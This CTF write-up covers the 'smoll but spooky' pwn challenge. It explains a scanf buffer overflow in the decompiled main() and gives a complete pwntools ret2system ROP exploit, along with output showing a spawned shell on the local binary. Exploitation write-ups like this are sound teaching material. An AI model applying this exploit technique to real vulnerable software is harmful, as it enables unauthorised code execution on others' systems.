# smoll but spooky

Again I didn't attempt this challenge, what a waste. Anyway's here's the description:

<figure><img src="../../../.gitbook/assets/image (856).png" alt=""><figcaption></figcaption></figure>

It mentions that there is a "bash". This hints that the `/bin/sh` string is present in the binary itself. Let us confirm this

<figure><img src="../../../.gitbook/assets/image (858).png" alt=""><figcaption></figcaption></figure>

Yep, that confirms it. Let's try looking at `main()`&#x20;

```c
undefined8 main(void)

{
  undefined buffer [16];
  
  system("echo -n \"Is it that spooky?\"");
  __isoc99_scanf(&DAT_004006c5,buffer);
  printf("Welcome to Blackberry CTF 2025, %s!\n",buffer);
  return 0;
}
```

We can notice 2 things here: &#x20;

1. &#x20;`system()` is called from the library into the PLT (Procedure Linkage Table) meaning it has a `system@plt` entry in the ELF&#x20;
2. There is a Buffer Overflow here:

```c
__isoc99_scanf(&DAT_004006c5,buffer);
```

This is a good candidate for ret2system exploitation because we have the necessary components for it.

We have two options on building the script, we can do it manually or do a ROP chain. I will do both because it's fun muehehehe

```python
from pwn import *

elf = context.binary = ELF('./smoll-but-spooky', checksec=False)
context.log_level = 'info'

io = process()

offset = 24    # offset found using gdb
ret = 0x400479    # found using ropper
# pop_rdi = 0x400683

# binsh = next(elf.search(b'/bin/sh\x00'))
# system = elf.sym['system']


# payload = flat(
# 	b'A' * offset,
# 	ret,
# 	pop_rdi,
# 	binsh,
# 	system
# )

rop = ROP(elf)

rop.raw(ret)    # stack alignment
rop.system(next(elf.search(b'/bin/sh\x00')))

io.sendlineafter(b"Is it that spooky?", flat({offset: rop.chain()}))
io.interactive()
```

```
❯ python3 script.py

[+] Starting local process '/home/mfkrypt/bbctf/pwn/spooky/smoll-but-spooky': pid 697118
/usr/lib/python3/dist-packages/ropgadget/gadgets.py:263: SyntaxWarning: invalid escape sequence '\?'
  [b"\xd6\?[\x00-\x03]{1}[\x00\x20\x40\x60\x80\xa0\xc0\xe0]{1}", 4, 4]  # blr reg # noqa: W605 # FIXME: \?
/usr/lib/python3/dist-packages/ropgadget/gadgets.py:268: SyntaxWarning: invalid escape sequence '\?'
  [b"[\x00\x20\x40\x60\x80\xa0\xc0\xe0]{1}[\x00-\x03]{1}\?\xd6", 4, 4]  # blr reg # noqa: W605 # FIXME: \?
/usr/lib/python3/dist-packages/ropgadget/ropchain/arch/ropmakerx64.py:29: SyntaxWarning: invalid escape sequence '\['
  regex = re.search("mov .* ptr \[(?P<dst>([(rax)|(rbx)|(rcx)|(rdx)|(rsi)|(rdi)|(r9)|(r10)|(r11)|(r12)|(r13)|(r14)|(r15)]{3}))\], (?P<src>([(rax)|(rbx)|(rcx)|(rdx)|(rsi)|(rdi)|(r9)|(r10)|(r11)|(r12)|(r13)|(r14)|(r15)]{3}))$", f)
/usr/lib/python3/dist-packages/ropgadget/ropchain/arch/ropmakerx86.py:29: SyntaxWarning: invalid escape sequence '\['
  regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)
[*] Loaded 14 cached gadgets for './smoll-but-spooky'
[*] Switching to interactive mode
Welcome to Blackberry CTF 2025, aaaabaaacaaadaaaeaaafaaay\x04@!
$ whoami
mfkrypt
```
